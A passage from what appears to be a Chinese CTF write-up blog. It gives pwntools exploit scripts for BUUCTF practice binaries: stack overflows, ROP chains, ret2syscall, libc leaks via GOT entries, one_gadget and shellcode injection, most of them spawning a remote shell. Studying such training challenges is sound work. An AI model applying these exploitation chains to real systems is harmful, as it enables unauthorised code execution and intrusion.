+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26722)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn4&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn4&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">system &#x3D; 0x80489b8</span><br><span class="line">payload &#x3D; &#39;a&#39;*56</span><br><span class="line">payload +&#x3D; p32(0x080489A0) + p32(0x0804E6A0)</span><br><span class="line">payload +&#x3D; p32(0x308CD64F) + p32(0x195719D1)</span><br><span class="line">sleep(0.1)</span><br><span class="line">sl(payload)</span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里主要是gets这个函数没有退出，所以需要exit来强制退出，之后读flag就行</p>
+</blockquote>
+<p>第二中 静态链接应该想到ret2syscall</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b91e6</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806fc30</span></span><br><span class="line">int_0x80 = <span class="number">0x0806d7e5</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line">gets_addr = <span class="number">0x0804F630</span></span><br><span class="line">pop_ebx_ret =  <span class="number">0x080481ad</span>  <span class="comment">#0x080481ad : pop ebx ; ret</span></span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">bss_addr = <span class="number">0x080ECD70</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26722</span>)</span><br><span class="line">p = process(<span class="string">"./pwn4"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn4"</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">56</span> + p32(gets_addr) + p32(main_addr) + p32(bss_addr)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">b"/bin/sh"</span>)</span><br><span class="line">payload2 = <span class="string">b"A"</span>*<span class="number">0x38</span> + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)  +p32(bss_addr) + p32(int_0x80)</span><br><span class="line">sl(payload2)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>原题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rl=<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29937</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3")</span></span><br><span class="line">elf = ELF(<span class="string">"./LibC"</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">ru(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">rl()</span><br><span class="line">rl()</span><br><span class="line">puts = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">print(libc)</span><br><span class="line">libc_base = puts-libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">sl(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>var[13] = ‘\x11’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26219)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0x04*13) + p64(17)</span><br><span class="line">print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>sysytem和/bin/sh都有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29272)</span><br><span class="line">bin_sh &#x3D; 0x0804A024</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;level2&quot;)</span><br><span class="line">sys &#x3D; elf.plt[&quot;system&quot;]</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0x88+0x4) + p32(sys) + p32(0) + p32(bin_sh)</span><br><span class="line">print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="not-the-same-3dsctf-2016（32位write调用）"><a href="#not-the-same-3dsctf-2016（32位write调用）" class="headerlink" title="not_the_same_3dsctf_2016（32位write调用）"></a>not_the_same_3dsctf_2016（32位write调用）</h2><p>把bss段上的flag直接通过write函数拿出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29106)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn9&quot;)</span><br><span class="line">bss&#x3D;0x080eca2d</span><br><span class="line">payload&#x3D;&#39;a&#39;*(0x2d)+p32(0x80489a0)+p32(elf.sym[&#39;write&#39;])+p32(0)+p32(1)+p32(bss)+p32(45)</span><br><span class="line">#print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>主要来熟悉一下这个东西</p>
+<p>one_gadget</p>
+<p>有libc基址直接就可以上one_gadget</p>
+<blockquote>
+<p>功能：查找已知的libc中exevce(“/bin/sh”)语句的地址<br>用法: one_gadget libc-x.xx.so</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29935)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">ru(&quot;here is the gift for u:&quot;)</span><br><span class="line">printf &#x3D; int(ru(&#39;\n&#39;)[2:],16)</span><br><span class="line"></span><br><span class="line">libcbase &#x3D; printf - libc.sym[&quot;printf&quot;]  </span><br><span class="line">one_gadget &#x3D; 0x106ef8</span><br><span class="line">leak(&quot;printf&quot;,libcbase)</span><br><span class="line">sys &#x3D; libcbase + one_gadget</span><br><span class="line">payload &#x3D; str(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27635)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sl(32)</span><br><span class="line">sys &#x3D; 0x4006E6</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x18 + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29338)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sys &#x3D; 0x400490</span><br><span class="line">bin_sh &#x3D; 0x601048</span><br><span class="line">pop_rdi &#x3D; 0x400683</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x18 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27323)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sys &#x3D; 0x4004C0</span><br><span class="line">bin_sh &#x3D; 0x600A90</span><br><span class="line">pop_rdi &#x3D; 0x4006b3</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x88 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><blockquote>
+<p>写shellcode要注意不同架构下</p>
+<p>shellcode是不同的</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ret &#x3D; 0x4004c9</span><br><span class="line">bss &#x3D; 0x601080</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">print(len(shellcode))</span><br><span class="line">sla(&quot;tell me your name\n&quot;,shellcode)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x28 + p64(bss)</span><br><span class="line">sla(&quot;me?\n&quot;,payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><blockquote>
+<p>32位puts泄露</p>
+<p>但好像put的got表不可以泄露</p>
+<p>需要试一试其他的</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29708</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(log)</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Please input new log info:"</span>)</span><br><span class="line">    sl(log)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn14"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">sl(<span class="string">"administrator"</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">main = <span class="number">0x8048722</span></span><br><span class="line">sys = <span class="number">0x80484D0</span></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x48</span>+<span class="number">0x4</span>) + p32(puts_plt) + p32(main) + p32(printf_got)</span><br><span class="line">add(payload)</span><br><span class="line">getflag()</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">printf = uu32(r(<span class="number">4</span>))</span><br><span class="line">print(printf)</span><br><span class="line">libc = LibcSearcher(<span class="string">"printf"</span>,printf)</span><br><span class="line">libc_base = printf - libc.dump(<span class="string">"printf"</span>)</span><br><span class="line">leak(<span class="string">"printf"</span>,libc_base)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">sl(<span class="string">"administrator"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x48</span>+<span class="number">0x4</span>) + p32(sys) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">add(payload)</span><br><span class="line">getflag()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="铁人三项-第五赛区-2018-rop-32位write泄露"><a href="#铁人三项-第五赛区-2018-rop-32位write泄露" class="headerlink" title="铁人三项(第五赛区)_2018_rop(32位write泄露)"></a>铁人三项(第五赛区)_2018_rop(32位write泄露)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27242</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn15"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x80484C6</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">0</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">write = uu32(r(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">leak(<span class="string">"write"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(sys) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="bjdctf-2020-babyrop-64位puts泄露"><a href="#bjdctf-2020-babyrop-64位puts泄露" class="headerlink" title="bjdctf_2020_babyrop(64位puts泄露)"></a>bjdctf_2020_babyrop(64位puts泄露)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27648</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn17"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4006AD</span></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) +p64(puts_got)+ p64(puts_plt) + p64(main) </span><br><span class="line"></span><br><span class="line">sla(<span class="string">"Pull up your sword and tell me u story!\n"</span>,payload)</span><br><span class="line">puts = uu64(ru(<span class="string">'\n'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">libc_base = puts - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">leak(<span class="string">"puts"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>连上就有</p>
+<h2 id="pwn2-sctf-2016（32位printf泄露）"><a href="#pwn2-sctf-2016（32位printf泄露）" class="headerlink" title="pwn2_sctf_2016（32位printf泄露）"></a>pwn2_sctf_2016（32位printf泄露）</h2><blockquote>
+<p>好像prinf的got表打不通</p>
+</blockquote>
